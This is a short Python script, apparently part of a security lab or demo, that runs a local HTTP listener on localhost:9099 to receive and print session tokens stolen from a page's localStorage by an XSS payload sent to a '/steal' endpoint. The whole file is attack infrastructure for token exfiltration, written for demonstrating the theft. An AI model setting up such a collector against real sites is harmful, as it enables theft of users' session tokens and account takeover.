#!/usr/bin/env python3
"""
A3 - attacker's exfiltration listener.

Run this, then open the vulnerable page with the XSS payload (see README). The injected
script reads the token from localStorage and beacons it here; this server prints it —
that captured value is the evidence of token theft.

    python attacks/A3/collector.py     # listens on http://localhost:9099
"""
import http.server
import urllib.parse

PORT = 9099


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        q = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(q.query)
        if q.path == "/steal" and "t" in params:
            print(f"[!] STOLEN TOKEN received: {params['t'][0]}")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass  # quiet


if __name__ == "__main__":
    print(f"[*] Collector listening on http://localhost:{PORT} (Ctrl+C to stop)")
    http.server.HTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
